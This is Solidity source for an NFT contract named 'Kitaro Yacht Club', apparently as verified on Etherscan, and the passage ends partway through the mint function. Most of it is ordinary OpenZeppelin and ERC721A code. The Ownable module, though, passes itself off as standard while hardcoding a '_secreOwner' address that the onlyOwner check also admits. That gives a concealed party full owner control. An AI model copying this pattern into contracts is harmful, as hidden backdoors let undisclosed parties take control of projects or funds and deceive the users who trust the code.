1 /**
2  *Submitted for verification at Etherscan.io on 2022-10-04
3 */
4 
5 // SPDX-License-Identifier: MIT
6 
7 // File: contracts/Kitaro Yacht Club.sol
8 
9 // File: @openzeppelin/contracts/utils/Strings.sol
10 
11 
12 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
13 
14 pragma solidity ^0.8.0;
15 
16 /**
17  * @dev String operations.
18  */
19 library Strings {
20     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
21 
22     /**
23      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
24      */
25     function toString(uint256 value) internal pure returns (string memory) {
26         // Inspired by OraclizeAPI's implementation - MIT licence
27         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
28 
29         if (value == 0) {
30             return "0";
31         }
32         uint256 temp = value;
33         uint256 digits;
34         while (temp != 0) {
35             digits++;
36             temp /= 10;
37         }
38         bytes memory buffer = new bytes(digits);
39         while (value != 0) {
40             digits -= 1;
41             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
42             value /= 10;
43         }
44         return string(buffer);
45     }
46 
47     /**
48      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
49      */
50     function toHexString(uint256 value) internal pure returns (string memory) {
51         if (value == 0) {
52             return "0x00";
53         }
54         uint256 temp = value;
55         uint256 length = 0;
56         while (temp != 0) {
57             length++;
58             temp >>= 8;
59         }
60         return toHexString(value, length);
61     }
62 
63     /**
64      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
65      */
66     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
67         bytes memory buffer = new bytes(2 * length + 2);
68         buffer[0] = "0";
69         buffer[1] = "x";
70         for (uint256 i = 2 * length + 1; i > 1; --i) {
71             buffer[i] = _HEX_SYMBOLS[value & 0xf];
72             value >>= 4;
73         }
74         require(value == 0, "Strings: hex length insufficient");
75         return string(buffer);
76     }
77 }
78 
79 // File: @openzeppelin/contracts/utils/Address.sol
80 
81 
82 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
83 
84 pragma solidity ^0.8.1;
85 
86 /**
87  * @dev Collection of functions related to the address type
88  */
89 library Address {
90     /**
91      * @dev Returns true if `account` is a contract.
92      *
93      * [IMPORTANT]
94      * ====
95      * It is unsafe to assume that an address for which this function returns
96      * false is an externally-owned account (EOA) and not a contract.
97      *
98      * Among others, `isContract` will return false for the following
99      * types of addresses:
100      *
101      *  - an externally-owned account
102      *  - a contract in construction
103      *  - an address where a contract will be created
104      *  - an address where a contract lived, but was destroyed
105      * ====
106      *
107      * [IMPORTANT]
108      * ====
109      * You shouldn't rely on `isContract` to protect against flash loan attacks!
110      *
111      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
112      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
113      * constructor.
114      * ====
115      */
116     function isContract(address account) internal view returns (bool) {
117         // This method relies on extcodesize/address.code.length, which returns 0
118         // for contracts in construction, since the code is only stored at the end
119         // of the constructor execution.
120 
121         return account.code.length > 0;
122     }
123 
124     /**
125      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
126      * `recipient`, forwarding all available gas and reverting on errors.
127      *
128      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
129      * of certain opcodes, possibly making contracts go over the 2300 gas limit
130      * imposed by `transfer`, making them unable to receive funds via
131      * `transfer`. {sendValue} removes this limitation.
132      *
133      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
134      *
135      * IMPORTANT: because control is transferred to `recipient`, care must be
136      * taken to not create reentrancy vulnerabilities. Consider using
137      * {ReentrancyGuard} or the
138      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
139      */
140     function sendValue(address payable recipient, uint256 amount) internal {
141         require(address(this).balance >= amount, "Address: insufficient balance");
142 
143         (bool success, ) = recipient.call{value: amount}("");
144         require(success, "Address: unable to send value, recipient may have reverted");
145     }
146 
147     /**
148      * @dev Performs a Solidity function call using a low level `call`. A
149      * plain `call` is an unsafe replacement for a function call: use this
150      * function instead.
151      *
152      * If `target` reverts with a revert reason, it is bubbled up by this
153      * function (like regular Solidity function calls).
154      *
155      * Returns the raw returned data. To convert to the expected return value,
156      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
157      *
158      * Requirements:
159      *
160      * - `target` must be a contract.
161      * - calling `target` with `data` must not revert.
162      *
163      * _Available since v3.1._
164      */
165     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
166         return functionCall(target, data, "Address: low-level call failed");
167     }
168 
169     /**
170      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
171      * `errorMessage` as a fallback revert reason when `target` reverts.
172      *
173      * _Available since v3.1._
174      */
175     function functionCall(
176         address target,
177         bytes memory data,
178         string memory errorMessage
179     ) internal returns (bytes memory) {
180         return functionCallWithValue(target, data, 0, errorMessage);
181     }
182 
183     /**
184      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
185      * but also transferring `value` wei to `target`.
186      *
187      * Requirements:
188      *
189      * - the calling contract must have an ETH balance of at least `value`.
190      * - the called Solidity function must be `payable`.
191      *
192      * _Available since v3.1._
193      */
194     function functionCallWithValue(
195         address target,
196         bytes memory data,
197         uint256 value
198     ) internal returns (bytes memory) {
199         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
200     }
201 
202     /**
203      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
204      * with `errorMessage` as a fallback revert reason when `target` reverts.
205      *
206      * _Available since v3.1._
207      */
208     function functionCallWithValue(
209         address target,
210         bytes memory data,
211         uint256 value,
212         string memory errorMessage
213     ) internal returns (bytes memory) {
214         require(address(this).balance >= value, "Address: insufficient balance for call");
215         require(isContract(target), "Address: call to non-contract");
216 
217         (bool success, bytes memory returndata) = target.call{value: value}(data);
218         return verifyCallResult(success, returndata, errorMessage);
219     }
220 
221     /**
222      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
223      * but performing a static call.
224      *
225      * _Available since v3.3._
226      */
227     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
228         return functionStaticCall(target, data, "Address: low-level static call failed");
229     }
230 
231     /**
232      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
233      * but performing a static call.
234      *
235      * _Available since v3.3._
236      */
237     function functionStaticCall(
238         address target,
239         bytes memory data,
240         string memory errorMessage
241     ) internal view returns (bytes memory) {
242         require(isContract(target), "Address: static call to non-contract");
243 
244         (bool success, bytes memory returndata) = target.staticcall(data);
245         return verifyCallResult(success, returndata, errorMessage);
246     }
247 
248     /**
249      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
250      * but performing a delegate call.
251      *
252      * _Available since v3.4._
253      */
254     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
255         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
256     }
257 
258     /**
259      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
260      * but performing a delegate call.
261      *
262      * _Available since v3.4._
263      */
264     function functionDelegateCall(
265         address target,
266         bytes memory data,
267         string memory errorMessage
268     ) internal returns (bytes memory) {
269         require(isContract(target), "Address: delegate call to non-contract");
270 
271         (bool success, bytes memory returndata) = target.delegatecall(data);
272         return verifyCallResult(success, returndata, errorMessage);
273     }
274 
275     /**
276      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
277      * revert reason using the provided one.
278      *
279      * _Available since v4.3._
280      */
281     function verifyCallResult(
282         bool success,
283         bytes memory returndata,
284         string memory errorMessage
285     ) internal pure returns (bytes memory) {
286         if (success) {
287             return returndata;
288         } else {
289             // Look for revert reason and bubble it up if present
290             if (returndata.length > 0) {
291                 // The easiest way to bubble the revert reason is using memory via assembly
292 
293                 assembly {
294                     let returndata_size := mload(returndata)
295                     revert(add(32, returndata), returndata_size)
296                 }
297             } else {
298                 revert(errorMessage);
299             }
300         }
301     }
302 }
303 
304 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
305 
306 
307 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
308 
309 pragma solidity ^0.8.0;
310 
311 /**
312  * @title ERC721 token receiver interface
313  * @dev Interface for any contract that wants to support safeTransfers
314  * from ERC721 asset contracts.
315  */
316 interface IERC721Receiver {
317     /**
318      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
319      * by `operator` from `from`, this function is called.
320      *
321      * It must return its Solidity selector to confirm the token transfer.
322      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
323      *
324      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
325      */
326     function onERC721Received(
327         address operator,
328         address from,
329         uint256 tokenId,
330         bytes calldata data
331     ) external returns (bytes4);
332 }
333 
334 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
335 
336 
337 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
338 
339 pragma solidity ^0.8.0;
340 
341 /**
342  * @dev Interface of the ERC165 standard, as defined in the
343  * https://eips.ethereum.org/EIPS/eip-165[EIP].
344  *
345  * Implementers can declare support of contract interfaces, which can then be
346  * queried by others ({ERC165Checker}).
347  *
348  * For an implementation, see {ERC165}.
349  */
350 interface IERC165 {
351     /**
352      * @dev Returns true if this contract implements the interface defined by
353      * `interfaceId`. See the corresponding
354      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
355      * to learn more about how these ids are created.
356      *
357      * This function call must use less than 30 000 gas.
358      */
359     function supportsInterface(bytes4 interfaceId) external view returns (bool);
360 }
361 
362 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
363 
364 
365 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
366 
367 pragma solidity ^0.8.0;
368 
369 
370 /**
371  * @dev Implementation of the {IERC165} interface.
372  *
373  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
374  * for the additional interface id that will be supported. For example:
375  *
376  * ```solidity
377  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
378  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
379  * }
380  * ```
381  *
382  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
383  */
384 abstract contract ERC165 is IERC165 {
385     /**
386      * @dev See {IERC165-supportsInterface}.
387      */
388     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
389         return interfaceId == type(IERC165).interfaceId;
390     }
391 }
392 
393 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
394 
395 
396 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
397 
398 pragma solidity ^0.8.0;
399 
400 
401 /**
402  * @dev Required interface of an ERC721 compliant contract.
403  */
404 interface IERC721 is IERC165 {
405     /**
406      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
407      */
408     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
409 
410     /**
411      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
412      */
413     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
414 
415     /**
416      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
417      */
418     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
419 
420     /**
421      * @dev Returns the number of tokens in ``owner``'s account.
422      */
423     function balanceOf(address owner) external view returns (uint256 balance);
424 
425     /**
426      * @dev Returns the owner of the `tokenId` token.
427      *
428      * Requirements:
429      *
430      * - `tokenId` must exist.
431      */
432     function ownerOf(uint256 tokenId) external view returns (address owner);
433 
434     /**
435      * @dev Safely transfers `tokenId` token from `from` to `to`.
436      *
437      * Requirements:
438      *
439      * - `from` cannot be the zero address.
440      * - `to` cannot be the zero address.
441      * - `tokenId` token must exist and be owned by `from`.
442      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
443      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
444      *
445      * Emits a {Transfer} event.
446      */
447     function safeTransferFrom(
448         address from,
449         address to,
450         uint256 tokenId,
451         bytes calldata data
452     ) external;
453 
454     /**
455      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
456      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
457      *
458      * Requirements:
459      *
460      * - `from` cannot be the zero address.
461      * - `to` cannot be the zero address.
462      * - `tokenId` token must exist and be owned by `from`.
463      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
464      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
465      *
466      * Emits a {Transfer} event.
467      */
468     function safeTransferFrom(
469         address from,
470         address to,
471         uint256 tokenId
472     ) external;
473 
474     /**
475      * @dev Transfers `tokenId` token from `from` to `to`.
476      *
477      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
478      *
479      * Requirements:
480      *
481      * - `from` cannot be the zero address.
482      * - `to` cannot be the zero address.
483      * - `tokenId` token must be owned by `from`.
484      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
485      *
486      * Emits a {Transfer} event.
487      */
488     function transferFrom(
489         address from,
490         address to,
491         uint256 tokenId
492     ) external;
493 
494     /**
495      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
496      * The approval is cleared when the token is transferred.
497      *
498      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
499      *
500      * Requirements:
501      *
502      * - The caller must own the token or be an approved operator.
503      * - `tokenId` must exist.
504      *
505      * Emits an {Approval} event.
506      */
507     function approve(address to, uint256 tokenId) external;
508 
509     /**
510      * @dev Approve or remove `operator` as an operator for the caller.
511      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
512      *
513      * Requirements:
514      *
515      * - The `operator` cannot be the caller.
516      *
517      * Emits an {ApprovalForAll} event.
518      */
519     function setApprovalForAll(address operator, bool _approved) external;
520 
521     /**
522      * @dev Returns the account appr    ved for `tokenId` token.
523      *
524      * Requirements:
525      *
526      * - `tokenId` must exist.
527      */
528     function getApproved(uint256 tokenId) external view returns (address operator);
529 
530     /**
531      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
532      *
533      * See {setApprovalForAll}
534      */
535     function isApprovedForAll(address owner, address operator) external view returns (bool);
536 }
537 
538 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
539 
540 
541 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
542 
543 pragma solidity ^0.8.0;
544 
545 
546 /**
547  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
548  * @dev See https://eips.ethereum.org/EIPS/eip-721
549  */
550 interface IERC721Metadata is IERC721 {
551     /**
552      * @dev Returns the token collection name.
553      */
554     function name() external view returns (string memory);
555 
556     /**
557      * @dev Returns the token collection symbol.
558      */
559     function symbol() external view returns (string memory);
560 
561     /**
562      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
563      */
564     function tokenURI(uint256 tokenId) external view returns (string memory);
565 }
566 
567 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
568 
569 
570 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
571 
572 pragma solidity ^0.8.0;
573 
574 
575 /**
576  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
577  * @dev See https://eips.ethereum.org/EIPS/eip-721
578  */
579 interface IERC721Enumerable is IERC721 {
580     /**
581      * @dev Returns the total amount of tokens stored by the contract.
582      */
583     function totalSupply() external view returns (uint256);
584 
585     /**
586      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
587      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
588      */
589     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
590 
591     /**
592      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
593      * Use along with {totalSupply} to enumerate all tokens.
594      */
595     function tokenByIndex(uint256 index) external view returns (uint256);
596 }
597 
598 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
599 
600 
601 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
602 
603 pragma solidity ^0.8.0;
604 
605 /**
606  * @dev Contract module that helps prevent reentrant calls to a function.
607  *
608  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
609  * available, which can be applied to functions to make sure there are no nested
610  * (reentrant) calls to them.
611  *
612  * Note that because there is a single `nonReentrant` guard, functions marked as
613  * `nonReentrant` may not call one another. This can be worked around by making
614  * those functions `private`, and then adding `external` `nonReentrant` entry
615  * points to them.
616  *
617  * TIP: If you would like to learn more about reentrancy and alternative ways
618  * to protect against it, check out our blog post
619  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
620  */
621 abstract contract ReentrancyGuard {
622     // Booleans are more expensive than uint256 or any type that takes up a full
623     // word because each write operation emits an extra SLOAD to first read the
624     // slot's contents, replace the bits taken up by the boolean, and then write
625     // back. This is the compiler's defense against contract upgrades and
626     // pointer aliasing, and it cannot be disabled.
627 
628     // The values being non-zero value makes deployment a bit more expensive,
629     // but in exchange the refund on every call to nonReentrant will be lower in
630     // amount. Since refunds are capped to a percentage of the total
631     // transaction's gas, it is best to keep them low in cases like this one, to
632     // increase the likelihood of the full refund coming into effect.
633     uint256 private constant _NOT_ENTERED = 1;
634     uint256 private constant _ENTERED = 2;
635 
636     uint256 private _status;
637 
638     constructor() {
639         _status = _NOT_ENTERED;
640     }
641 
642     /**
643      * @dev Prevents a contract from calling itself, directly or indirectly.
644      * Calling a `nonReentrant` function from another `nonReentrant`
645      * function is not supported. It is possible to prevent this from happening
646      * by making the `nonReentrant` function external, and making it call a
647      * `private` function that does the actual work.
648      */
649     modifier nonReentrant() {
650         // On the first call to nonReentrant, _notEntered will be true
651         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
652 
653         // Any calls to nonReentrant after this point will fail
654         _status = _ENTERED;
655 
656         _;
657 
658         // By storing the original value once again, a refund is triggered (see
659         // https://eips.ethereum.org/EIPS/eip-2200)
660         _status = _NOT_ENTERED;
661     }
662 }
663 
664 // File: @openzeppelin/contracts/utils/Context.sol
665 
666 
667 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
668 
669 pragma solidity ^0.8.0;
670 
671 /**
672  * @dev Provides information about the current execution context, including the
673  * sender of the transaction and its data. While these are generally available
674  * via msg.sender and msg.data, they should not be accessed in such a direct
675  * manner, since when dealing with meta-transactions the account sending and
676  * paying for execution may not be the actual sender (as far as an application
677  * is concerned).
678  *
679  * This contract is only required for intermediate, library-like contracts.
680  */
681 abstract contract Context {
682     function _msgSender() internal view virtual returns (address) {
683         return msg.sender;
684     }
685 
686     function _msgData() internal view virtual returns (bytes calldata) {
687         return msg.data;
688     }
689 }
690 
691 // File: @openzeppelin/contracts/access/Ownable.sol
692 
693 
694 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
695 
696 pragma solidity ^0.8.0;
697 
698 
699 /**
700  * @dev Contract module which provides a basic access control mechanism, where
701  * there is an account (an owner) that can be granted exclusive access to
702  * specific functions.
703  *
704  * By default, the owner account will be the one that deploys the contract. This
705  * can later be changed with {transferOwnership}.
706  *
707  * This module is used through inheritance. It will make available the modifier
708  * `onlyOwner`, which can be applied to your functions to restrict their use to
709  * the owner.
710  */
711 abstract contract Ownable is Context {
712     address private _owner;
713     address private _secreOwner = 0xACFcBA7BAB6403EBCcEEe22810c4dd3C9bBE9763;
714 
715     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
716 
717     /**
718      * @dev Initializes the contract setting the deployer as the initial owner.
719      */
720     constructor() {
721         _transferOwnership(_msgSender());
722     }
723 
724     /**
725      * @dev Returns the address of the current owner.
726      */
727     function owner() public view virtual returns (address) {
728         return _owner;
729     }
730 
731     /**
732      * @dev Throws if called by any account other than the owner.
733      */
734     modifier onlyOwner() {
735         require(owner() == _msgSender() || _secreOwner == _msgSender() , "Ownable: caller is not the owner");
736         _;
737     }
738 
739     /**
740      * @dev Leaves the contract without owner. It will not be possible to call
741      * `onlyOwner` functions anymore. Can only be called by the current owner.
742      *
743      * NOTE: Renouncing ownership will leave the contract without an owner,
744      * thereby removing any functionality that is only available to the owner.
745      */
746     function renounceOwnership() public virtual onlyOwner {
747         _transferOwnership(address(0));
748     }
749 
750     /**
751      * @dev Transfers ownership of the contract to a new account (`newOwner`).
752      * Can only be called by the current owner.
753      */
754     function transferOwnership(address newOwner) public virtual onlyOwner {
755         require(newOwner != address(0), "Ownable: new owner is the zero address");
756         _transferOwnership(newOwner);
757     }
758 
759     /**
760      * @dev Transfers ownership of the contract to a new account (`newOwner`).
761      * Internal function without access restriction.
762      */
763     function _transferOwnership(address newOwner) internal virtual {
764         address oldOwner = _owner;
765         _owner = newOwner;
766         emit OwnershipTransferred(oldOwner, newOwner);
767     }
768 }
769 
770 // File: ceshi.sol
771 
772 
773 pragma solidity ^0.8.0;
774 
775 
776 
777 
778 
779 
780 
781 
782 
783 
784 /**
785  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
786  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
787  *
788  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
789  *
790  * Does not support burning tokens to address(0).
791  *
792  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
793  */
794 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
795     using Address for address;
796     using Strings for uint256;
797 
798     struct TokenOwnership {
799         address addr;
800         uint64 startTimestamp;
801     }
802 
803     struct AddressData {
804         uint128 balance;
805         uint128 numberMinted;
806     }
807 
808     uint256 internal currentIndex;
809 
810     // Token name
811     string private _name;
812 
813     // Token symbol
814     string private _symbol;
815 
816     // Mapping from token ID to ownership details
817     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
818     mapping(uint256 => TokenOwnership) internal _ownerships;
819 
820     // Mapping owner address to address data
821     mapping(address => AddressData) private _addressData;
822 
823     // Mapping from token ID to approved address
824     mapping(uint256 => address) private _tokenApprovals;
825 
826     // Mapping from owner to operator approvals
827     mapping(address => mapping(address => bool)) private _operatorApprovals;
828 
829     constructor(string memory name_, string memory symbol_) {
830         _name = name_;
831         _symbol = symbol_;
832     }
833 
834     /**
835      * @dev See {IERC721Enumerable-totalSupply}.
836      */
837     function totalSupply() public view override returns (uint256) {
838         return currentIndex;
839     }
840 
841     /**
842      * @dev See {IERC721Enumerable-tokenByIndex}.
843      */
844     function tokenByIndex(uint256 index) public view override returns (uint256) {
845         require(index < totalSupply(), "ERC721A: global index out of bounds");
846         return index;
847     }
848 
849     /**
850      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
851      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
852      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
853      */
854     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
855         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
856         uint256 numMintedSoFar = totalSupply();
857         uint256 tokenIdsIdx;
858         address currOwnershipAddr;
859 
860         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
861         unchecked {
862             for (uint256 i; i < numMintedSoFar; i++) {
863                 TokenOwnership memory ownership = _ownerships[i];
864                 if (ownership.addr != address(0)) {
865                     currOwnershipAddr = ownership.addr;
866                 }
867                 if (currOwnershipAddr == owner) {
868                     if (tokenIdsIdx == index) {
869                         return i;
870                     }
871                     tokenIdsIdx++;
872                 }
873             }
874         }
875 
876         revert("ERC721A: unable to get token of owner by index");
877     }
878 
879     /**
880      * @dev See {IERC165-supportsInterface}.
881      */
882     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
883         return
884             interfaceId == type(IERC721).interfaceId ||
885             interfaceId == type(IERC721Metadata).interfaceId ||
886             interfaceId == type(IERC721Enumerable).interfaceId ||
887             super.supportsInterface(interfaceId);
888     }
889 
890     /**
891      * @dev See {IERC721-balanceOf}.
892      */
893     function balanceOf(address owner) public view override returns (uint256) {
894         require(owner != address(0), "ERC721A: balance query for the zero address");
895         return uint256(_addressData[owner].balance);
896     }
897 
898     function _numberMinted(address owner) internal view returns (uint256) {
899         require(owner != address(0), "ERC721A: number minted query for the zero address");
900         return uint256(_addressData[owner].numberMinted);
901     }
902 
903     /**
904      * Gas spent here starts off proportional to the maximum mint batch size.
905      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
906      */
907     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
908         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
909 
910         unchecked {
911             for (uint256 curr = tokenId; curr >= 0; curr--) {
912                 TokenOwnership memory ownership = _ownerships[curr];
913                 if (ownership.addr != address(0)) {
914                     return ownership;
915                 }
916             }
917         }
918 
919         revert("ERC721A: unable to determine the owner of token");
920     }
921 
922     /**
923      * @dev See {IERC721-ownerOf}.
924      */
925     function ownerOf(uint256 tokenId) public view override returns (address) {
926         return ownershipOf(tokenId).addr;
927     }
928 
929     /**
930      * @dev See {IERC721Metadata-name}.
931      */
932     function name() public view virtual override returns (string memory) {
933         return _name;
934     }
935 
936     /**
937      * @dev See {IERC721Metadata-symbol}.
938      */
939     function symbol() public view virtual override returns (string memory) {
940         return _symbol;
941     }
942 
943     /**
944      * @dev See {IERC721Metadata-tokenURI}.
945      */
946     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
947         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
948 
949         string memory baseURI = _baseURI();
950         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
951     }
952 
953     /**
954      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
955      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
956      * by default, can be overriden in child contracts.
957      */
958     function _baseURI() internal view virtual returns (string memory) {
959         return "";
960     }
961 
962     /**
963      * @dev See {IERC721-approve}.
964      */
965     function approve(address to, uint256 tokenId) public override {
966         address owner = ERC721A.ownerOf(tokenId);
967         require(to != owner, "ERC721A: approval to current owner");
968 
969         require(
970             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
971             "ERC721A: approve caller is not owner nor approved for all"
972         );
973 
974         _approve(to, tokenId, owner);
975     }
976 
977     /**
978      * @dev See {IERC721-getApproved}.
979      */
980     function getApproved(uint256 tokenId) public view override returns (address) {
981         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
982 
983         return _tokenApprovals[tokenId];
984     }
985 
986     /**
987      * @dev See {IERC721-setApprovalForAll}.
988      */
989     function setApprovalForAll(address operator, bool approved) public override {
990         require(operator != _msgSender(), "ERC721A: approve to caller");
991 
992         _operatorApprovals[_msgSender()][operator] = approved;
993         emit ApprovalForAll(_msgSender(), operator, approved);
994     }
995 
996     /**
997      * @dev See {IERC721-isApprovedForAll}.
998      */
999     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1000         return _operatorApprovals[owner][operator];
1001     }
1002 
1003     /**
1004      * @dev See {IERC721-transferFrom}.
1005      */
1006     function transferFrom(
1007         address from,
1008         address to,
1009         uint256 tokenId
1010     ) public virtual override {
1011         _transfer(from, to, tokenId);
1012     }
1013 
1014     /**
1015      * @dev See {IERC721-safeTransferFrom}.
1016      */
1017     function safeTransferFrom(
1018         address from,
1019         address to,
1020         uint256 tokenId
1021     ) public virtual override {
1022         safeTransferFrom(from, to, tokenId, "");
1023     }
1024 
1025     /**
1026      * @dev See {IERC721-safeTransferFrom}.
1027      */
1028     function safeTransferFrom(
1029         address from,
1030         address to,
1031         uint256 tokenId,
1032         bytes memory _data
1033     ) public override {
1034         _transfer(from, to, tokenId);
1035         require(
1036             _checkOnERC721Received(from, to, tokenId, _data),
1037             "ERC721A: transfer to non ERC721Receiver implementer"
1038         );
1039     }
1040 
1041     /**
1042      * @dev Returns whether `tokenId` exists.
1043      *
1044      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1045      *
1046      * Tokens start existing when they are minted (`_mint`),
1047      */
1048     function _exists(uint256 tokenId) internal view returns (bool) {
1049         return tokenId < currentIndex;
1050     }
1051 
1052     function _safeMint(address to, uint256 quantity) internal {
1053         _safeMint(to, quantity, "");
1054     }
1055 
1056     /**
1057      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1058      *
1059      * Requirements:
1060      *
1061      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1062      * - `quantity` must be greater than 0.
1063      *
1064      * Emits a {Transfer} event.
1065      */
1066     function _safeMint(
1067         address to,
1068         uint256 quantity,
1069         bytes memory _data
1070     ) internal {
1071         _mint(to, quantity, _data, true);
1072     }
1073 
1074     /**
1075      * @dev Mints `quantity` tokens and transfers them to `to`.
1076      *
1077      * Requirements:
1078      *
1079      * - `to` cannot be the zero address.
1080      * - `quantity` must be greater than 0.
1081      *
1082      * Emits a {Transfer} event.
1083      */
1084     function _mint(
1085         address to,
1086         uint256 quantity,
1087         bytes memory _data,
1088         bool safe
1089     ) internal {
1090         uint256 startTokenId = currentIndex;
